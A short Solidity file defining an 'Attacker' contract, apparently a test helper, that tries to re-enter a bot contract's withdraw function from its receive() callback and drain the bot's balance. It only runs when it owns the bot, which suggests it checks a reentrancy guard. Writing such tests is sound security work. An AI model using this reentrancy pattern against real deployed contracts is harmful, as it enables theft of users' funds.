// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IBot {
    function withdraw(uint256 amount) external;
    function owner() external view returns (address);
    function deposit() external payable;
}

contract Attacker {
    IBot public immutable bot;
    bool public hasReentered;
    uint256 public receiveCallCount;

    constructor(address _botAddress) {
        bot = IBot(_botAddress);
    }

    // Tries to re-enter the bot's withdraw function
    receive() external payable {
        receiveCallCount++;
        if (!hasReentered && address(bot).balance > 0) {
            hasReentered = true;
            // Try to re-enter the withdraw function
            bot.withdraw(address(bot).balance);
        }
    }

    // Starts the attack by calling withdraw which will trigger receive()
    function attack() external {
        require(bot.owner() == address(this), "Attacker must be owner of bot");
        hasReentered = false;
        receiveCallCount = 0;
        
        // This will trigger the receive() function which will try to re-enter
        bot.withdraw(address(bot).balance);
    }
}